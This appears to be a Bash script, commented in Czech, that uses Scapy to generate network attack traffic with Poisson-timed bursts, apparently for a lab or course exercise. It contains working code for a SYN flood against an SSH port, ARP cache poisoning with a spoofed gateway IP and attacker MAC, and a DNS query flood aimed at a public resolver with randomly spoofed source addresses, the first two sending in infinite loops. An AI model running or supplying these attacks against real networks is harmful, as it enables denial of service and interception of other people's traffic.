#!/bin/bash -x

ACTION="$1"
LAMBDA="$2"
NUM="$3"

if [ $# -lt 3 ]; then
	echo "Pouziti $0 AKCE LAMBDA POCET_PAKETU"
fi

###### PARAMETRY #################
#1)SYN ATTACK PARAMETRY
SYN_DST_ADDRESS="192.168.1.13"
SYN_DST_PORT=22
#2)ARP poissoning
VICTIM_MAC="00:00:00:00:00:00"
SPOOFED_SENDER_IP="192.168.1.1"
SPOOFED_IP="192.168.1.13"
ATTACKER_MAC="00:00:00:00:00:BE"
#3)DNS flood
DNS_FLOOD_VICTIM="8.8.8.8"
DNS_QUERY="www.fit.cvut.cz."

case $ACTION in
	SYN)
scapy <<-END
import time
def spack():
	#1)generovani paketu pro SYN
	packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport=$SYN_DST_PORT, flags='S')
	ls(packetSYN)
	send(packetSYN,loop=1) #posilej paket v nekonecne smycce
x=$NUM
while x>0:
	x-=1;
	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
	spack();
END
		;;
	ARP)
scapy <<-END
import time
def spack():
	#2)ARP poisoning
	packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
	ls(packetARP)
	sendp(packetARP,loop=1) #posilej paket v nekonecne smycce

x=$NUM
while x>0:
	x-=1;
	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
	spack();
END

		;;
	DNS)
scapy <<-END
#1)generovani paketu pro SYN
import time
def spack():
	#3)DNS flood
	dnsq=IP(dst="$DNS_FLOOD_VICTIM",src=RandIP())/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname='$DNS_QUERY',qtype='A',qclass='IN'))
	ls(dnsq)
	#send(dnsq,loop=1)

x=$NUM
while x>0:
	x-=1;
	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
	spack();
END

		;;
esac
